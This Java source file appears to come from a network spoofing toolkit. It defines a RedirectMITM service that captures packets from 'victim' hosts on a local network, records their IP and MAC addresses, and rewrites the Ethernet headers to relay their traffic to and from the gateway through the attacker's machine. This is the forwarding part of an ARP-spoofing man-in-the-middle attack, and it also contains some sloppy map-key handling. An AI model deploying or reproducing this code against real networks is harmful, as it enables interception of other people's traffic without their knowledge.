package org.bitducks.spoofing.services;

import java.io.IOException;
import java.net.InetAddress;
import java.util.Arrays;
import java.util.HashMap;

import jpcap.packet.EthernetPacket;
import jpcap.packet.IPPacket;
import jpcap.packet.Packet;

import org.apache.log4j.Logger;
import org.bitducks.spoofing.core.InterfaceInfo;
import org.bitducks.spoofing.core.Server;
import org.bitducks.spoofing.core.Service;
import org.bitducks.spoofing.customrules.IpAndMacFilterRule;
import org.bitducks.spoofing.gateway.GatewayFindService;
import org.bitducks.spoofing.util.gateway.GatewayFinder;

public class RedirectMITM extends Service {

	private InterfaceInfo serverInfo;
	private HashMap<InetAddress, byte[]> ipToMac = new HashMap<InetAddress, byte[]>();
	private InetAddress gatewayIP;
	private byte[] gatewayMAC;

	public RedirectMITM() {
		logger = Logger.getLogger(RedirectMITM.class);
		serverInfo = Server.getInstance().getInfo();
		this.getPolicy().addRule(new IpAndMacFilterRule(serverInfo.getAddress(), serverInfo.getMacAddress()));
		try {
			gatewayIP = GatewayFinder.find(serverInfo.getDevice());
		} catch (IOException e) {
			e.printStackTrace();
		}
	}

	@Override
	public void run() {
		logger.info("Traffic redirection started");
		
		GatewayFindService finder = new GatewayFindService();
		Server.getInstance().addService(finder);
		gatewayMAC = finder.getMacAddress();
		System.out.println(Arrays.toString(gatewayMAC));
		
		while(! this.isCloseRequested()){
			Packet toTransfer = this.getNextBlockingPacket();
			logger.info("Packet to be redirected found");
			redirectPacket(toTransfer);
		}
	}

	private void redirectPacket(Packet p) {
		IPPacket victmIP = (IPPacket)p;
		EthernetPacket victimEthernet = (EthernetPacket)p.datalink;
		
		if (!isPacketResponse(p)) {	
			logger.info("Packet from someone");
			if (ipToMac.get(victmIP) == null || Arrays.equals(ipToMac.get(victmIP), victimEthernet.src_mac)) {
				ipToMac.put(victmIP.src_ip, victimEthernet.src_mac);
			}
			else {
				logger.error("Invalid IP (" + victmIP + ") <--> MAC (" + ipToMac.get(victmIP) + ")correspondence detected! Overriding the old one");
				ipToMac.put(victmIP.src_ip, victimEthernet.src_mac);
			}
			victimEthernet.src_mac = serverInfo.getMacAddress();
			victimEthernet.dst_mac = gatewayMAC;
			p.datalink = victimEthernet;
			
			Server.getInstance().sendPacket(p);
		}
		else { 										//Response from the gateway
			logger.info("Packet from Gateway");
			if (ipToMac.get(victmIP) != null) {
				victimEthernet.src_mac = serverInfo.getMacAddress();
				victimEthernet.dst_mac = ipToMac.get(victmIP);
				p.datalink = victimEthernet;
				Server.getInstance().sendPacket(p);
			}
			else {
				logger.error("No MAC correspondence found for the packet");
			}
		}
	}

	public boolean isPacketResponse(Packet p) {
		if ( Arrays.equals(gatewayMAC, ((EthernetPacket)p.datalink).src_mac)) {
			return true;
		}
		return false;
	}

}
